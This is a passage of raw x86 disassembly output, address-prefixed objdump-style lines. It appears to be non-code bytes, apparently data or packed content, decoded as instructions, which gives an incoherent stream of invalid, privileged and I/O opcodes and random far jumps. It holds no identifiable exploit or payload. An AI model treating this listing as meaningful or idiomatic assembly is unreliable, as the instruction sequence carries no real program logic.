  412b90:	(bad)  
  412b92:	out    dx,al
  412b93:	adc    ch,BYTE PTR [edi-0x3b674f85]
  412b99:	adc    DWORD PTR [eax+eax*2],0xffffffad
  412b9d:	lds    edx,FWORD PTR [edx-0x32552601]
  412ba3:	arpl   WORD PTR [edx],cx
  412ba5:	(bad)  
  412ba6:	aam    0x61
  412ba8:	add    DWORD PTR [eax+0x33a06549],ebx
  412bae:	dec    eax
  412baf:	and    bl,bh
  412bb1:	daa    
  412bb2:	pop    esi
  412bb3:	fstp   TBYTE PTR [esi-0x78]
  412bb6:	aaa    
  412bb7:	adc    eax,eax
  412bb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bba:	loopne 0x412c3b
  412bbc:	retf   0xb7fa
  412bbf:	daa    
  412bc0:	popf   
  412bc1:	(bad)  
  412bc2:	jge    0x412b7d
  412bc4:	shl    esp,1
  412bc6:	jo     0x412bef
  412bc8:	mov    ebx,0x504dbf85
  412bcd:	ret    0x92ba
  412bd0:	(bad)  
  412bd1:	in     eax,dx
  412bd2:	sti    
  412bd3:	adc    al,0x50
  412bd5:	arpl   cx,sp
  412bd7:	ret    
  412bd8:	push   ecx
  412bd9:	stos   DWORD PTR es:[edi],eax
  412bda:	cmp    al,0x6b
  412bdc:	in     eax,0xae
  412bde:	cmp    DWORD PTR [eax],edi
  412be0:	push   ds
  412be1:	mov    ecx,0x829a27d5
  412be6:	dec    esp
  412be7:	int3   
  412be8:	mov    cl,0x47
  412bea:	mov    eax,ds:0x53806e3e
  412bef:	mov    dh,0x89
  412bf1:	(bad)  es:0x2b8fc7d6
  412bf8:	ret    
  412bf9:	je     0x412c4c
  412bfb:	adc    bh,BYTE PTR [edx]
  412bfd:	dec    esp
  412bfe:	pop    ss
  412bff:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  412c01:	mov    ebp,0x813bb940
  412c06:	jne    0x412bc5
  412c08:	push   eax
  412c09:	fnsave [ebx+0x1ffaa7c9]
  412c0f:	jge    0x412c20
  412c11:	stos   BYTE PTR es:[edi],al
  412c12:	jl     0x412c92
  412c14:	outs   dx,DWORD PTR ds:[esi]
  412c15:	push   ebp
  412c16:	(bad)  
  412c17:	inc    edx
  412c18:	or     al,0xda
  412c1a:	sbb    al,BYTE PTR [ecx-0x59]
  412c1d:	aad    0xbc
  412c1f:	inc    edi
  412c20:	call   esi
  412c22:	in     eax,dx
  412c23:	push   ebx
  412c24:	sbb    DWORD PTR [esi+ebp*2],0xffffff99
  412c28:	in     eax,dx
  412c29:	sbb    DWORD PTR [ebx+0x7f],eax
  412c2c:	xchg   ebx,eax
  412c2d:	push   ds
  412c2e:	inc    eax
  412c2f:	jmp    0x412bd9
  412c31:	jmp    0x860b:0xebff2aec
  412c38:	add    ecx,esp
  412c3a:	popf   
  412c3b:	push   ds
  412c3c:	rdtsc  
  412c3e:	inc    edx
  412c3f:	retf   
  412c40:	mov    ch,0xa
  412c42:	sub    al,0x2f
  412c44:	mov    ds:0xda32369c,eax
  412c49:	mov    ds:0xcbf4809d,eax
  412c4e:	mov    edx,0x747c2ba4
  412c53:	dec    ebx
  412c54:	mov    edi,0x1731eab
  412c59:	sbb    al,0xe8
  412c5b:	leave  
  412c5c:	retf   
  412c5d:	(bad)  
  412c5e:	cmp    al,0xa3
  412c60:	push   cs
  412c61:	test   BYTE PTR [esi-0x5f553d2b],dh
  412c67:	dec    ebx
  412c68:	rol    DWORD PTR [ebx],0x45
  412c6b:	cmp    ah,bl
  412c6d:	push   ss
  412c6e:	dec    esi
  412c6f:	das    
  412c70:	or     dh,BYTE PTR [ebx-0xd902725]
  412c76:	inc    esi
  412c77:	ret    
  412c78:	pop    ds
  412c79:	dec    edi
  412c7a:	mov    ds:0x42c215bb,al
  412c7f:	xchg   edi,eax
  412c80:	arpl   WORD PTR [edx+0x55a5843c],bx
  412c86:	fimul  WORD PTR ds:0x4f0a4a6a
  412c8c:	jb     0x412ca3
  412c8e:	retf   
  412c8f:	dec    ebp
  412c90:	sahf   
  412c91:	and    dh,BYTE PTR gs:[eax]
  412c94:	sbb    BYTE PTR [edi-0x708fe9a],0x2d
  412c9b:	or     dl,BYTE PTR [ebx-0x5757073c]
  412ca1:	daa    
  412ca2:	mov    edi,0xc761a111
  412ca7:	shl    DWORD PTR [esi],cl
  412ca9:	pop    ecx
  412caa:	imul   esi,DWORD PTR [esi+0xa469796],0x1ea27bbd
  412cb4:	ins    BYTE PTR es:[edi],dx
  412cb5:	push   ebx
  412cb6:	jne    0x412cec
  412cb8:	push   ebp
  412cb9:	mov    ebp,0xb2c8c0d5
  412cbe:	cmp    al,0x30
  412cc0:	outs   dx,DWORD PTR ds:[esi]
  412cc1:	dec    esp
  412cc2:	mov    DWORD PTR [ebp-0x5c],edi
  412cc5:	ins    DWORD PTR es:[edi],dx
  412cc6:	cli    
  412cc7:	jo     0x412ca7
  412cc9:	fwait
  412cca:	jmp    0x1a0a:0x54eb8472
  412cd1:	loop   0x412d01
  412cd3:	pop    edx
  412cd4:	mov    ebp,0x7e8c4244
  412cd9:	test   BYTE PTR [esi-0x5c8b4d51],ch
  412cdf:	jno    0x412cd2
  412ce1:	lahf   
  412ce2:	xchg   esi,eax
  412ce3:	mov    ah,0x86
  412ce5:	or     al,0x72
  412ce7:	jp     0x412d03
  412ce9:	dec    edi
  412cea:	sti    
  412ceb:	iret   
  412cec:	hlt    
  412ced:	loope  0x412d1b
  412cef:	call   0x18905a90
  412cf4:	adc    BYTE PTR [ebx-0x2d],bh
  412cf7:	test   eax,esp
  412cf9:	rol    DWORD PTR [ebx+0x1d],cl
  412cfc:	adc    ebp,0xd434b596
  412d02:	shl    esi,cl
  412d04:	add    DWORD PTR ds:0xbd92c479,ebp
  412d0b:	fs daa 
  412d0d:	mov    edi,0x22fcb98d
  412d12:	fbld   TBYTE PTR [ecx-0x703a06c4]
  412d18:	iret   
  412d19:	jecxz  0x412d3e
  412d1b:	test   DWORD PTR [ecx],ebp
  412d1d:	lock sub dh,BYTE PTR [ebx+0x39]
  412d21:	mov    esp,0x8acdd030
  412d26:	push   0x9
  412d28:	rol    DWORD PTR [eax],1
  412d2a:	pop    ebp
  412d2b:	int    0xbc
  412d2d:	ds jnp 0x412d6c
  412d30:	xchg   bl,ah
  412d32:	pop    edx
  412d33:	(bad)  
  412d34:	std    
  412d35:	out    0xb1,eax
  412d37:	push   ds
  412d38:	mov    cl,0xf9
  412d3a:	push   ebx
  412d3b:	das    
  412d3c:	xchg   ebx,eax
  412d3d:	pop    esi
  412d3e:	xchg   esi,eax
  412d3f:	push   esp
  412d40:	sub    DWORD PTR [edi],0x7d
  412d43:	dec    esp
  412d44:	pop    ds
  412d45:	nop
  412d46:	daa    
  412d47:	xor    al,0xd6
  412d49:	lods   eax,DWORD PTR ds:[esi]
  412d4a:	dec    ebx
  412d4b:	out    0xec,al
  412d4d:	pop    ebp
  412d4e:	mov    al,0x9
  412d50:	inc    edi
  412d51:	nop
  412d52:	cmp    al,0x83
  412d54:	sbb    dl,ch
  412d56:	add    dl,al
  412d58:	pop    ebx
  412d59:	out    dx,al
  412d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d5b:	push   ebx
  412d5c:	das    
  412d5d:	adc    ecx,DWORD PTR [edx+0x30]
  412d60:	kmovb  k7,ebp
  412d64:	stos   BYTE PTR es:[edi],al
  412d65:	inc    ebp
  412d66:	pop    ss
  412d67:	xchg   ebp,eax
  412d68:	jo     0x412d40
  412d6a:	pop    edx
  412d6b:	popf   
  412d6c:	pop    edx
  412d6d:	push   es
  412d6e:	push   esi
  412d6f:	jbe    0x412dd6
  412d71:	hlt    
  412d72:	mov    ebx,0x8bdbbca8
  412d77:	xor    al,0x65
  412d79:	mov    dh,0xa6
  412d7b:	xchg   edx,eax
  412d7c:	or     esi,ecx
  412d7e:	lahf   
  412d7f:	mov    bl,BYTE PTR [ebp+0x14]
  412d82:	aas    
  412d83:	pushf  
  412d84:	pop    esi
  412d85:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d87:	xor    dl,dl
  412d89:	push   eax
  412d8a:	outs   dx,BYTE PTR ds:[esi]
  412d8b:	test   al,0xb0
  412d8d:	pop    ds
  412d8e:	cdq    
  412d8f:	push   0x7fb7b46c
  412d94:	ror    edx,cl
  412d96:	aas    
  412d97:	mov    ah,0x63
  412d99:	add    al,0xaa
  412d9b:	xchg   ebp,eax
  412d9c:	jae    0x412e1b
  412d9e:	and    ebp,DWORD PTR [ebx+0x8]
  412da1:	mov    ebx,0xb6e5712f
  412da6:	push   edx
  412da7:	pop    esp
  412da8:	sbb    DWORD PTR [ebx-0x4834f6f5],0x35fcb3e1
  412db2:	mov    cl,0x63
  412db4:	push   cs
  412db5:	jne    0x412d38
  412db7:	(bad)  
  412db8:	dec    edi
  412db9:	dec    edi
  412dba:	inc    edi
  412dbb:	mov    bh,dl
  412dbd:	imul   esi,DWORD PTR [eax+0x21d14a40],0x27988a29
  412dc7:	xor    DWORD PTR [esi+0x731a03ed],eax
  412dcd:	rol    edi,1
  412dcf:	inc    ebp
  412dd0:	test   al,0xd
  412dd2:	dec    ecx
  412dd3:	pop    esp
  412dd4:	int3   
  412dd5:	xor    ebx,DWORD PTR [edx+edi*2+0x6]
  412dd9:	lock addr16 push esi
  412ddc:	nop
  412ddd:	cmp    al,0x75
  412ddf:	mov    edx,0x47bf1990
  412de4:	lods   al,BYTE PTR ds:[esi]
  412de5:	push   es
  412de6:	and    DWORD PTR [edi-0x5648c0b3],ebp
  412dec:	in     eax,0x62
  412dee:	xchg   BYTE PTR [esp+eiz*4-0xfe615b8],ah
  412df5:	(bad)
  412df9:	pop    esi
  412dfa:	shl    edi,cl
  412dfc:	jo     0x412e63
  412dfe:	or     ebp,DWORD PTR [edx]
  412e00:	jle    0x412e6e
  412e02:	cld    
  412e03:	rol    BYTE PTR [ebx+0x72],cl
  412e06:	sti    
  412e07:	add    BYTE PTR [edi-0x34f332d1],al
  412e0d:	adc    DWORD PTR [ebp+0x37],eax
  412e10:	mov    eax,0xe0f6ed6c
  412e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e16:	not    BYTE PTR [edi-0x5e3fe662]
  412e1c:	out    dx,eax
  412e1d:	or     al,0x0
  412e1f:	leave  
  412e20:	xchg   esi,eax
  412e21:	jl     0x412e2e
  412e23:	pusha  
  412e24:	mov    al,0xf3
  412e26:	cld    
  412e27:	push   cs
  412e28:	aam    0xb4
  412e2a:	adc    eax,0xaf2202ce
  412e2f:	adc    DWORD PTR [ecx-0x101b673a],edi
  412e35:	(bad)  
  412e36:	sbb    eax,0xa1dee109
  412e3b:	cld    
  412e3c:	mov    edi,0x32d17f5f
  412e41:	ins    DWORD PTR es:[edi],dx
  412e42:	pop    ds
  412e43:	shl    DWORD PTR [edi+0x110e14e],1
  412e49:	adc    eax,0x2f957d19
  412e4e:	test   al,0xcd
  412e50:	retf   
  412e51:	adc    BYTE PTR [ecx],0x70
  412e54:	cdq    
  412e55:	xlat   BYTE PTR ds:[ebx]
  412e56:	shl    DWORD PTR [eax+eax*4],cl
  412e59:	daa    
  412e5a:	add    ebx,0x7a2e0178
  412e60:	fwait
  412e61:	mov    al,ds:0xff21bee
  412e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e67:	dec    ebp
  412e68:	outs   dx,BYTE PTR ds:[esi]
  412e69:	mov    WORD PTR [edx],fs
  412e6b:	add    al,0x10
  412e6d:	je     0x412e3b
  412e6f:	stc    
  412e70:	mov    ah,0x1f
  412e72:	sub    DWORD PTR [edx+0x17],ebx
  412e75:	ss dec ebp
  412e77:	inc    ebx
  412e78:	repnz mov ax,0xd47
  412e7d:	adc    al,BYTE PTR [esi]
  412e7f:	lahf   
  412e80:	outs   dx,DWORD PTR ds:[esi]
  412e81:	pop    eax
  412e82:	std    
  412e83:	push   es
  412e84:	adc    eax,0xfa2778bf
  412e89:	push   ebp
  412e8a:	outs   dx,BYTE PTR ds:[esi]
  412e8b:	enter  0xdf36,0xbe
  412e8f:	ins    BYTE PTR es:[edi],dx
  412e90:	xor    ebp,DWORD PTR [ebx]
  412e92:	mov    eax,0xfcd72e22
  412e97:	in     eax,dx
  412e98:	sbb    BYTE PTR gs:[ebp+0x19],dl
  412e9c:	jno    0x412f00
  412e9e:	imul   esp,DWORD PTR [ebx+0x38],0x71
  412ea2:	pop    edx
  412ea3:	xchg   edx,eax
  412ea4:	sahf   
  412ea5:	cdq    
  412ea6:	sub    dh,cl
  412ea8:	rcr    ebp,0xf3
  412eab:	mov    ds:0x7ca41673,al
  412eb0:	inc    esi
  412eb1:	hlt    
  412eb2:	mov    esp,0xe87f8193
  412eb7:	jg     0x412eaf
  412eb9:	xchg   ebx,eax
  412eba:	ret    
  412ebb:	push   0x953d1ad9
  412ec0:	sub    ecx,esp
  412ec2:	test   BYTE PTR [edi-0x32d86a37],ah
  412ec8:	xchg   DWORD PTR [edi+0x19b52cc2],esi
  412ece:	in     eax,dx
  412ecf:	push   esp
  412ed0:	ror    BYTE PTR [edi+0x15acc746],0x62
  412ed7:	call   0x8c2d2936
  412edc:	in     al,0x9d
  412ede:	mov    ds:0xed0d3a61,al
  412ee3:	add    eax,edx
  412ee5:	jle    0x412ee1
  412ee7:	rcr    dh,cl
  412ee9:	adc    cl,cl
  412eeb:	fs ror dh,1
  412eee:	fldenv [eax]
  412ef0:	(bad)  
  412ef2:	and    DWORD PTR [esp+edx*2-0x986ef0e],ebx
  412ef9:	shr    ebp,0xa4
  412efc:	add    eax,0x122c6af7
  412f01:	jno    0x412efa
  412f03:	sbb    BYTE PTR [ebp-0x6a],cl
  412f06:	dec    ebp
  412f08:	xor    BYTE PTR [esi],ch
  412f0a:	jmp    0x632:0x3f573292
  412f11:	loop   0x412e9d
  412f13:	data16 add BYTE PTR [esi+0x75],0x65
  412f18:	mov    edx,0x77c2352a
  412f1d:	jp     0x412f40
  412f1f:	imul   esp,DWORD PTR [edx-0x6a2e0aca],0xffffffaa
  412f26:	(bad)  
  412f27:	dec    ebp
  412f28:	enter  0xc819,0x1e
  412f2c:	lock xor dh,BYTE PTR ds:0x20b51dca
  412f33:	push   esp
  412f34:	retf   
  412f35:	jae    0x412f2b
  412f37:	mov    ebx,0xd676b767
  412f3c:	(bad)  
  412f3e:	and    eax,0xf20f91b2
  412f43:	(bad)  
  412f44:	stc    
  412f45:	and    al,0xe8
  412f47:	out    0xfb,eax
  412f49:	sub    eax,0x44409a88
  412f4e:	adc    ecx,DWORD PTR [ecx+esi*8]
  412f51:	outs   dx,BYTE PTR ds:[esi]
  412f52:	add    BYTE PTR [ebx],cl
  412f54:	(bad)  
  412f55:	cs xchg ebp,eax
  412f57:	shl    DWORD PTR [esi],1
  412f59:	mov    eax,ds:0x4cf25725
  412f5e:	jne    0x412f09
  412f60:	mov    dl,0x12
  412f62:	mov    esp,0xfb424744
  412f67:	pushf  
  412f68:	jp     0x412f01
  412f6a:	in     al,0x9c
  412f6c:	xchg   esi,eax
  412f6d:	outs   dx,DWORD PTR ds:[esi]
  412f6e:	test   DWORD PTR [esi],0x2a60676b
  412f74:	out    dx,eax
  412f75:	ret    0x6017
  412f78:	pop    ds
  412f79:	xor    al,cl
  412f7b:	add    eax,0xa980bf1f
  412f80:	iret   
  412f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f82:	nop
  412f83:	pop    ebp
  412f84:	pop    ecx
  412f85:	sbb    eax,0x60157750
  412f8a:	xchg   BYTE PTR [edi-0x2807ab71],ch
  412f90:	pushf  
  412f91:	mov    ecx,0x6095856f
  412f96:	add    ah,al
  412f98:	mov    eax,0xbfda9e0d
  412f9d:	ins    DWORD PTR es:[edi],dx
  412f9e:	dec    ebp
  412f9f:	dec    edx
  412fa0:	test   eax,0xbb529ade
  412fa5:	sub    al,0x22
  412fa7:	sbb    al,0xf1
  412fa9:	aad    0xd6
  412fab:	rol    BYTE PTR [edi],cl
  412fad:	(bad)  
  412faf:	mov    BYTE PTR [edi-0x31],bh
  412fb2:	sbb    DWORD PTR [ebp-0x3f],ebx
  412fb5:	pop    es
  412fb6:	adc    al,0xa9
  412fb8:	cmp    cl,BYTE PTR [esi]
  412fba:	adc    DWORD PTR [esi-0x65ae2e31],ebx
  412fc0:	push   edi
  412fc1:	cmp    al,0xb7
  412fc3:	loopne 0x412faa
  412fc5:	jp     0x412f87
  412fc7:	mov    cl,0x8b
  412fc9:	inc    esp
  412fca:	push   edi
  412fcb:	xor    esi,edx
  412fcd:	mov    esi,0x96a7feb9
  412fd2:	dec    ebp
  412fd3:	stos   BYTE PTR es:[edi],al
  412fd4:	mov    edx,0x6b83c5b1
  412fd9:	push   edi
  412fda:	leave  
  412fdb:	fidiv  WORD PTR [ebp+0x619e48f5]
  412fe1:	pop    ss
  412fe2:	cmp    eax,0x9c2b3abd
  412fe7:	test   al,0x4e
  412fe9:	sbb    al,0x5f
  412feb:	or     esp,0x85246e03
  412ff1:	lods   eax,DWORD PTR ds:[esi]
  412ff2:	push   ebx
  412ff3:	lds    edi,FWORD PTR [ebx+0x60]
  412ff6:	mov    eax,ds:0xf39bd53f
  412ffb:	add    al,ah
  412ffd:	pop    ebx
  412ffe:	mov    eax,0xc2bc5f8e
  413003:	aas    
  413004:	sub    ebx,DWORD PTR [ebx]
  413006:	imul   ecx,DWORD PTR [eax-0xd31f992],0xbacd78b6
  413010:	xchg   edx,eax
  413011:	and    ebp,esp
  413013:	out    dx,eax
  413014:	aaa    
  413015:	xchg   edi,eax
  413016:	adc    eax,0xaa4f1a59
  41301b:	pop    edx
  41301c:	adc    BYTE PTR ds:[esi],cl
  41301f:	stos   DWORD PTR es:[edi],eax
  413020:	iret   
  413021:	lahf   
  413022:	das    
  413023:	dec    ecx
  413024:	and    BYTE PTR [eax-0x44ea6c87],ch
  41302a:	cmp    ebp,DWORD PTR [ecx-0x23]
  41302d:	dec    esi
  41302e:	repnz push esp
  413030:	add    al,BYTE PTR [ecx+0x135f66f0]
  413036:	push   esp
  413037:	dec    edx
  413038:	mov    eax,gs:0x39d54342
  41303e:	int    0xfe
  413040:	add    BYTE PTR ds:0xf1ec9a94,dl
  413046:	shl    BYTE PTR [edx+edi*2],1
  413049:	jl     0x413075
  41304b:	mov    ah,0x4a
  41304d:	mov    edi,0x1cf63fc5
  413052:	repz (bad) [ebx+0xb4183b]
  413059:	(bad)  
  41305a:	and    ebx,DWORD PTR [eax+0x4042f676]
  413060:	ret    
  413061:	div    BYTE PTR [edi]
  413063:	xor    ecx,esi
  413065:	push   0xffffffe4
  413067:	dec    ecx
  413068:	mov    eax,0xec590210
  41306d:	jne    0x41307c
  41306f:	cmp    eax,0x57141645
  413074:	add    eax,0xc0fb2f54
  413079:	xchg   ecx,eax
  41307a:	js     0x412ffe
  41307c:	inc    esi
  41307d:	daa    
  41307e:	in     al,0x5c
  413080:	lods   al,BYTE PTR ds:[esi]
  413081:	enter  0xee03,0x38
  413085:	or     al,0xd8
  413087:	xchg   esp,eax
  413088:	push   ecx
  413089:	ret    
  41308a:	mov    ebx,0x9e9bbc1b
  41308f:	add    ch,ah
  413091:	shl    BYTE PTR [eax],1
  413093:	jge    0x4130a7
  413095:	push   es
  413096:	mov    bl,0x42
  413098:	fld    DWORD PTR [ebx+ecx*2+0x61]
  41309c:	jmp    0xf7de:0xce486c6a
  4130a3:	adc    eax,0x95473017
  4130a9:	sar    BYTE PTR [edi+0x5a023cfc],1
  4130af:	jb     0x413075
  4130b1:	call   0xe34:0xcc010c4a
  4130b8:	sahf   
  4130b9:	xchg   edx,eax
  4130ba:	xchg   ecx,eax
  4130bb:	ins    DWORD PTR es:[edi],dx
  4130bc:	pop    ds
  4130bd:	jbe    0x413134
  4130bf:	adc    dl,BYTE PTR [ebp+0x54]
  4130c2:	dec    esp
  4130c3:	and    al,0x52
  4130c5:	(bad)  
  4130c7:	sbb    DWORD PTR [ebx+0x5c72b402],ebx
  4130cd:	shr    BYTE PTR ds:0xdcf4cd5e,0xc2
  4130d4:	cmp    dl,BYTE PTR [ebp-0x11]
  4130d7:	xor    al,0xc2
  4130d9:	mov    ecx,0xf7d315cd
  4130de:	cld    
  4130df:	push   esi
  4130e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130e1:	aad    0x7d
  4130e3:	inc    eax
  4130e4:	(bad)  
  4130e5:	test   BYTE PTR [ecx-0x1121dda1],bh
  4130eb:	mov    ebp,0x65ec20b0
  4130f0:	ficom  WORD PTR [esi+0x1f]
  4130f3:	mov    ?,ebx
  4130f5:	push   edi
  4130f6:	jns    0x4130fc
  4130f8:	loop   0x4130df
  4130fa:	ins    BYTE PTR es:[edi],dx
  4130fb:	cmc    
  4130fc:	add    eax,0x912a1cf1
  413101:	jbe    0x41309a
  413103:	cmp    eax,0xd2155048
  413108:	jns    0x4130aa
  41310a:	stos   BYTE PTR es:[edi],al
  41310b:	imul   edx,DWORD PTR [edx-0x23be76c0],0xffffff9c
  413112:	mov    dh,0x6a
  413114:	cmp    al,BYTE PTR [ebx]
  413116:	pop    edi
  413117:	loopne 0x4130b6
  413119:	add    ecx,ebx
  41311b:	sbb    al,0xf5
  41311d:	mov    cl,0x2b
  41311f:	adc    ah,BYTE PTR [esi+0x46]
  413122:	mov    ebx,0x3214a93a
  413127:	lods   al,BYTE PTR ds:[esi]
  413128:	push   esp
  413129:	xchg   ebp,eax
  41312a:	push   ebp
  41312b:	jl     0x41312e
  41312d:	int3   
  41312e:	cdq    
  41312f:	and    dl,cl
  413131:	leave  
  413132:	pusha  
  413133:	stc    
  413134:	and    al,BYTE PTR [ebp-0x63]
  413137:	sbb    DWORD PTR [edi],eax
  413139:	or     al,BYTE PTR [esp+ebx*4-0x34]
  41313d:	retf   
  41313e:	mov    ds:0x386daaf8,eax
  413143:	add    BYTE PTR [edi+0x54],al
  413146:	test   bl,bl
  413148:	sub    al,0x2b
  41314a:	push   esi
  41314b:	xor    eax,0x5f5522cb
  413150:	cs xor eax,0x4a5687db
  413156:	or     DWORD PTR [ebx-0x3364f664],esi
  41315c:	jle    0x4131b5
  41315e:	xchg   DWORD PTR [ecx-0x13],eax
  413161:	jb     0x4130f0
  413163:	iret   
  413164:	push   ebp
  413165:	sbb    cl,al
  413167:	mov    bh,cl
  413169:	and    ecx,ebx
  41316b:	int3   
  41316c:	hlt    
  41316d:	stc    
  41316e:	sub    DWORD PTR [ebx+ecx*8+0x69],ecx
  413172:	addr16 inc ecx
  413174:	and    eax,0xe33a33a6
  413179:	xchg   ebp,eax
  41317a:	out    dx,al
  41317b:	int    0x6f
  41317d:	shr    DWORD PTR [edx],1
  41317f:	data16 fidivr WORD PTR [edx+ecx*1]
  413183:	inc    edx
  413184:	dec    edx
  413185:	xor    dh,bl
  413187:	dec    esp
  413188:	data16 cmp BYTE PTR fs:[edx],al
  41318c:	int3   
  41318d:	jl     0x4131c3
  41318f:	pop    ebp
  413190:	mov    esp,0xc147c76d
  413195:	mov    bl,0xb7
  413197:	scas   eax,DWORD PTR es:[edi]
  413198:	in     al,dx
  413199:	shl    DWORD PTR [ebx+0x3830ba56],cl
  41319f:	xchg   esp,eax
  4131a0:	stc    
  4131a1:	in     al,dx
  4131a2:	sub    al,0xba
  4131a4:	int    0x28
  4131a6:	sub    ebp,DWORD PTR [ebx]
  4131a8:	inc    ebp
  4131a9:	jmp    0xf3f:0x292daf6f
  4131b0:	call   0xcb5a:0x870e3d0b
  4131b7:	sbb    BYTE PTR [ebp+0x5a76e9ae],dh
  4131bd:	add    ebp,DWORD PTR [edx+0x74]
  4131c0:	mul    DWORD PTR ds:[ecx*8+0x5c3bd4ab]
  4131c8:	shr    DWORD PTR [edi+0x32],1
  4131cb:	sub    bl,dl
  4131cd:	repnz mov bl,0x31
  4131d0:	xor    al,bl
  4131d2:	adc    BYTE PTR [esp+eax*8],bh
  4131d5:	mov    BYTE PTR [ebp+ebx*2-0x7d],cl
  4131d9:	leave  
  4131da:	and    BYTE PTR [edx],dl
  4131dc:	aam    0xdb
  4131de:	sub    BYTE PTR [edi],0x89
  4131e1:	iret   
  4131e2:	dec    esp
  4131e3:	cmc    
  4131e4:	xchg   ebp,eax
  4131e5:	xor    ebp,DWORD PTR [ecx+0x36]
  4131e8:	mov    ch,0xcc
  4131ea:	adc    al,0x63
  4131ec:	push   edx
  4131ed:	jae    0x413205
  4131ef:	vminss xmm5,xmm6,DWORD PTR [edi+0xb]
  4131f4:	or     eax,0xdce37eb5
  4131f9:	frstor [esi-0x7bb8880c]
  4131ff:	or     DWORD PTR [edx-0x761bb04a],ebx
  413205:	(bad)  [eax+0x1]
  413208:	and    ah,BYTE PTR [eax+0x5c]
  41320b:	test   al,0xc1
  41320d:	enter  0xfebb,0x6
  413211:	repz mov es,WORD PTR [edi]
  413214:	addr16 sub al,0xa
  413217:	push   eax
  413218:	mov    dl,0x30
  41321a:	(bad)  
  41321b:	and    al,0xaf
  41321d:	stos   DWORD PTR es:[edi],eax
  41321e:	sbb    DWORD PTR [ecx+eiz*1+0x2c],esp
  413222:	or     bh,bh
  413224:	push   0x235be982
  413229:	inc    ebx
  41322a:	mov    dh,BYTE PTR [ecx+0x1bc6d460]
  413230:	xor    al,0xdd
  413232:	std    
  413233:	mov    bl,0x29
  413235:	inc    ecx
  413236:	xor    ecx,DWORD PTR [ebx-0x5657f2bb]
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	test   BYTE PTR [ebx+0x19],cl
  413240:	stc    
  413241:	mov    WORD PTR [eax-0x8],cs
  413244:	jno    0x4131f9
  413246:	or     eax,0xdb9e8a6f
  41324b:	mov    bl,0x71
  41324d:	dec    ebx
  41324e:	xchg   edx,eax
  41324f:	idiv   esi
  413251:	mov    ds:0xd16fe3c3,eax
  413256:	jmp    0x4132c4
  413258:	mov    bl,0xe2
  41325a:	add    bl,BYTE PTR [ebx+0x3f5441ae]
  413260:	xor    BYTE PTR [ebx],bl
  413262:	add    edx,edi
  413264:	jb     0x41325b
  413266:	shl    BYTE PTR fs:[edi+0x67],0xaf
  41326b:	popa   
  41326c:	mov    gs,WORD PTR [edx-0x4cf1f293]
  413272:	pop    ebp
  413273:	shr    edx,cl
  413275:	aas    
  413276:	xor    bl,BYTE PTR [esi]
  413278:	add    eax,DWORD PTR [edx+0x1847f3a1]
  41327e:	gs popw ds
  413281:	sub    eax,0x136be715
  413286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413287:	xchg   esi,eax
  413288:	bound  ecx,QWORD PTR [eax-0x1aa0bced]
  41328e:	xchg   dl,dh
  413290:	or     eax,0x93512f28
  413295:	std    
  413296:	sar    DWORD PTR [edi+0x586ae02e],1
  41329c:	fnsave [esi-0x421c421f]
  4132a2:	dec    ebx
  4132a3:	cwde   
  4132a4:	push   cs
  4132a5:	cmovno ebx,DWORD PTR [edi+0x52fc67a1]
  4132ac:	sub    eax,0x7c26e810
  4132b1:	imul   esp,DWORD PTR [esi-0x66da4567],0xfffffff7
  4132b8:	sbb    DWORD PTR [edx],eax
  4132ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132bb:	cli    
  4132bc:	ds dec esi
  4132be:	jmp    0xa13c:0x7595909
  4132c5:	in     eax,0x11
  4132c7:	adc    dl,BYTE PTR [eax]
  4132c9:	fs shl dh,0x2
  4132cd:	(bad)  
  4132ce:	or     eax,0xb113015c
  4132d3:	mov    cl,0x48
  4132d5:	clc    
  4132d6:	mov    edx,DWORD PTR [ebx+0x27227867]
  4132dc:	es js  0x413271
  4132df:	retf   
  4132e0:	mov    eax,ds:0x24c6565b
  4132e5:	push   edx
  4132e6:	sbb    bh,dl
  4132e8:	call   0x8334d587
  4132ed:	jns    0x413358
  4132ef:	loopne 0x4132eb
  4132f1:	adc    al,0xae
  4132f3:	retf   
  4132f4:	xchg   DWORD PTR [esi-0x76],ebp
  4132f7:	push   edi
  4132f8:	dec    edi
  4132f9:	jbe    0x413293
  4132fb:	add    DWORD PTR ds:[ebp-0x18],0xffffffd0
  413300:	inc    esi
  413301:	mov    edi,0xa7dac31a
  413306:	xchg   esp,eax
  413307:	pop    ss
  413308:	popf   
  413309:	mov    cl,0xff
  41330b:	and    esi,DWORD PTR [ecx]
  41330d:	dec    ebp
  41330e:	scas   al,BYTE PTR es:[edi]
  41330f:	xchg   ecx,eax
  413310:	pop    ebp
  413311:	mov    edx,0xd88413cc
  413316:	pop    esi
  413317:	jb     0x413351
  413319:	sub    ebp,DWORD PTR [edi+0x75df6290]
  41331f:	sti    
  413320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413321:	mov    cl,0x35
  413323:	pop    es
  413324:	mov    ds:0x4d555c7c,al
  413329:	cmp    BYTE PTR [edx],al
  41332b:	fwait
  41332c:	std    
  41332d:	inc    edx
  41332e:	inc    ecx
  41332f:	add    ecx,ecx
  413331:	icebp  
  413332:	fcom   DWORD PTR [ecx+0x4e6cef67]
  413338:	push   0xa1a0c036
  41333d:	shr    BYTE PTR [edi],cl
  41333f:	int    0x20
  413341:	ret    
  413342:	sub    ah,cl
  413344:	in     al,dx
  413345:	jle    0x4132ef
  413347:	push   ds
  413348:	mov    ch,0x8d
  41334a:	scas   al,BYTE PTR es:[edi]
  41334b:	add    al,0xf6
  41334d:	scas   eax,DWORD PTR es:[edi]
  41334e:	jno    0x4133ad
  413350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413351:	xchg   ch,cl
  413353:	int    0xef
  413355:	inc    ebp
  413356:	inc    ecx
  413357:	mov    esp,DWORD PTR [edi-0x61e55d50]
  41335d:	push   eax
  41335e:	and    dl,BYTE PTR [esi+edx*1+0x53847c9e]
